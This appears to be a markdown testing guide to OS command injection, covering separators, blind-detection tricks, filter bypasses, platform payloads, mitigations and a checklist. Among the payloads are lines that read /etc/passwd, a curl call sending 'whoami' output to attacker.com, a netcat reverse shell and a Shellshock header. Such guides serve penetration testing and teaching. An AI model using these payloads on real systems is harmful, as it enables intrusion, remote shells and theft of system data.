

# OS Command Injection Testing Guide

## Overview
OS Command Injection is a vulnerability that allows attackers to execute arbitrary OS commands on a server by manipulating application inputs.

## Types of Command Injection
1. **Active (Visible) Injection** - Direct command output visible in response
2. **Blind Injection** - No visible output (use time delays or out-of-band techniques)

## Detection Methods

### 1. Basic Testing
```bash
# Append commands
input; whoami
input && whoami
input | whoami

# Chain commands
input || whoami
input %0a whoami (URL-encoded newline)

### 2. Error-Based Detection
```

```bash

Copy

input'
input"
input ` (backtick)
input$() 

### 3. Blind Injection Techniques

**Time Delay Detection:**
```

```bash

Copy

input || ping -c 10 127.0.0.1
input & sleep 10

**Out-of-Band Detection:**
```

```bash

Copy

input || nslookup attacker.com
input || curl https://attacker.com/$(whoami)

```
### 4. Automated Testing

- **Burp Suite:** Use Active Scan with command injection payloads
    
- **OWASP ZAP:** Command Injection scanner
    
- **Commix:** Automated tool ([https://github.com/commixproject/commix](https://github.com/commixproject/commix))
    

## Exploitation Techniques

### Command Separators

bash

Copy

;
&&
|
||
%0a (newline)
%0d (carriage return)
` (backticks)
$()

### Bypassing Filters

**Case Manipulation:**

bash

Copy

WhOaMi

**Encoding:**

bash

Copy

input%0Aid
input%3Bcat+/etc/passwd

**White Space Bypass:**

bash

Copy

{cat,/etc/passwd}
cat$IFS/etc/passwd

### Platform-Specific Payloads

**Windows:**

powershell

Copy

ping%20localhost
|| ver

**Unix:**

bash

Copy

; cat /etc/passwd
`nc -e /bin/sh attacker.com 4444`

## Mitigation Strategies

1. **Input Validation**
    
    - Allowlist safe characters
        
    - Block special characters (; & | etc.)
        
2. **Use Safe APIs**
    
    python
    
    Copy
    
    # Instead of os.system()
    subprocess.run([fixed_command, user_input], shell=False)
    
3. **Output Encoding**
    
4. **Least Privilege Execution**
    
5. **Input Sanitization**
    
    - Escape special characters
        
    - Use built-in library functions instead of string concatenation
        

## Testing Checklist

- Test all user-controllable inputs
    
- Try both active and blind techniques
    
- Test different command separators
    
- Verify Windows and Unix payloads
    
- Check filter bypass techniques
    
- Validate error handling
    

## Example Scenarios

**Web Application Form:**

http

Copy

POST /ping HTTP/1.1
Host: example.com
...
address=8.8.8.8; whoami

**HTTP Header Injection:**

http

Copy

GET / HTTP/1.1
Host: example.com
User-Agent: () { :; }; /bin/bash -c 'cat /etc/passwd'









[writeup](https://github.com/payloadbox/command-injection-payload-list) 